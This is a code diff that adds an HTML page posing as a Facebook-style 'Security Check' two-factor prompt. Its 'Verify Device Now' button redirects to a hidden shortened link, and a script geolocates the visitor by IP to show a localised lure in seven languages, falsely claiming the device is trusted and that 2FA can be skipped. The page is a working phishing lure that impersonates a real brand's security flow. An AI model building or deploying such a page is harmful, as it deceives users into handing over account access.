@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        /* Tối ưu hóa font chữ để mượt và thanh mảnh hơn */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f0f2f5; 
+            -webkit-font-smoothing: antialiased; 
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            text-align: center; 
+            max-width: 400px; 
+            width: 90%; 
+        }
+
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #1877f2; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px; 
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        h2 { 
+            font-size: 18px; 
+            color: #1c1e21; 
+            font-weight: 600; 
+            margin-bottom: 15px;
+            margin-top: 0;
+        }
+
+        p { 
+            color: #606770; 
+            font-size: 14px; 
+            line-height: 1.5; 
+            margin-bottom: 25px; 
+            font-weight: 400; 
+        }
+
+        /* --- CẬP NHẬT CHUẨN FACEBOOK 2026 --- */
+        button { 
+            background-color: #1877f2; /* Màu xanh chuẩn Meta */
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 50px; /* Bo góc cực mạnh dạng viên thuốc */
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 15px; /* Giảm nhẹ font-size cho thanh thoát */
+            transition: background-color 0.2s, transform 0.1s; /* Thêm hiệu ứng nhấn */
+            width: 100%; 
+            outline: none;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); /* Đổ bóng nhẹ cho nút */
+        }
+
+        /* Hiệu ứng khi di chuột qua */
+        button:hover { 
+            background-color: #166fe5; 
+        }
+
+        /* Hiệu ứng khi nhấn xuống */
+        button:active {
+            transform: scale(0.98); /* Nhấn nhẹ nút xuống */
+            background-color: #1464cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="loader"></div>
+        <h2 id="title">Two-Factor Authentication (2FA)</h2>
+        <p id="desc">A new access request has been detected. Please verify your browser to complete the security check.</p>
+        <button id="btn" onclick="window.location.href='https://bom.so/RUINz4'">Verify Device Now</button>
+    </div>
+
+    <script>
+        const translations = {
+    'vi': { 
+        t: 'Bỏ qua xác thực 2 lớp (2FA)', 
+        d: 'Thiết bị của bạn đã được nhận diện là đáng tin cậy. Nhấn nút bên dưới để bỏ qua bước nhập mã và truy cập thẳng vào hệ thống.', 
+        b: 'Bỏ qua và Tiếp tục' 
+    },
+    'en': { 
+        t: 'Skip Two-Factor Authentication (2FA)', 
+        d: 'Your device has been recognized as trusted. Click the button below to skip the verification code and access the system directly.', 
+        b: 'Skip and Continue' 
+    },
+    'hu': { 
+        t: 'Kétfaktoros hitelesítés (2FA) kihagyása', 
+        d: 'Eszközét megbízhatónak ismertük fel. Kattintson az alábbi gombra az ellenőrző kód kihagyásához és a közvetlen belépéshez.', 
+        b: 'Kihagyás és folytatás' 
+    },
+    'de': { 
+        t: 'Zwei-Faktor-Authentifizierung (2FA) überspringen', 
+        d: 'Ihr Gerät wurde als vertrauenswürdig erkannt. Klicken Sie auf die Schaltfläche unten, um den Bestätigungscode zu überspringen.', 
+        b: 'Überspringen und fortfahren' 
+    },
+    'fr': { 
+        t: 'Ignorer l\'authentification à deux facteurs (2FA)', 
+        d: 'Votre appareil a été reconnu comme fiable. Cliquez sur le bouton ci-dessous pour ignorer le code de vérification.', 
+        b: 'Ignorer et continuer' 
+    },
+    'ar': { 
+        t: 'تخطي المصادقة الثنائية (2FA)', 
+        d: 'تم التعرف على جهازك كجهاز موثوق به. انقر فوق الزر أدناه لتخطي رمز التحقق والدخول مباشرة.', 
+        b: 'تخطي ومتابعة' 
+    },
+    'el': { 
+        t: 'Παράλειψη ελέγχου ταυτότητας 2 παραγόντων (2FA)', 
+        d: 'Η συσκευή σας αναγνωρίστηκε ως αξιόπιστη. Κάντε κλικ στο κουμπί για να παραλείψετε τον κωδικό επαλήθευσης.', 
+        b: 'Παράλειψη και συνέχεια' 
+    }
+};
+
+        function setContent(langCode) {
+            const lang = translations[langCode] || translations['en'];
+            document.getElementById('title').innerText = lang.t;
+            document.getElementById('desc').innerText = lang.d;
+            document.getElementById('btn').innerText = lang.b;
+            if (langCode === 'ar') document.body.style.direction = 'rtl';
+            else document.body.style.direction = 'ltr';
+        }
+
+        async function initSecurityCheck() {
+            // Khởi tạo nhanh bằng ngôn ngữ trình duyệt
+            let browserLang = (navigator.language || navigator.userLanguage).substring(0, 2).toLowerCase();
+            setContent(browserLang);
+
+            // Kiểm tra chính xác theo IP (đặc biệt cho Hungary)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data && data.country_code) {
+                    const country = data.country_code.toLowerCase();
+                    if (country !== browserLang) {
+                        setContent(country);
+                    }
+                }
+            } catch (e) {
+                console.log("Sử dụng ngôn ngữ mặc định.");
+            }
+        }
+
+        initSecurityCheck();
+    </script>
+</body>
+</html>
